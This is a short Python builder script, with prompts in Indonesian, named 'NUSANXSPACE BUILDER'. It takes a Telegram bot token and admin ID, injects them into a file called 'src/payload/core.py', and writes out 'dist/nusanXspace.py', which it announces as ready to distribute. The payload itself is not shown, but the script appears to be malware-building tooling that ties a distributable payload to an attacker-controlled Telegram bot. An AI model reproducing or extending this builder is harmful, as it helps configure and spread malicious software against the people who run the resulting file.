#!/usr/bin/env python3
import os
import sys
import shutil

print("""
╔══════════════════════════════╗
║    NUSANXSPACE BUILDER       ║
╚══════════════════════════════╝
""")

token = input("Masukkan BOT_TOKEN: ").strip()
admin = input("Masukkan ADMIN_ID: ").strip()

if not token or not admin:
    print("Error: Token dan Admin ID wajib diisi!")
    sys.exit(1)

print("\n[•] Building payload...")

with open("src/payload/core.py", "r") as f:
    content = f.read()

content = content.replace('BOT_TOKEN = "7378131831:AAHx_xxxxxxxxxxxxx_your_token_here"', f'BOT_TOKEN = "{token}"')
content = content.replace('ADMIN_ID = 123456789', f'ADMIN_ID = {admin}')

os.makedirs("dist", exist_ok=True)
with open("dist/nusanXspace.py", "w") as f:
    f.write(content)

print("[✓] Payload created: dist/nusanXspace.py")
print("\nFile siap didistribusikan!")
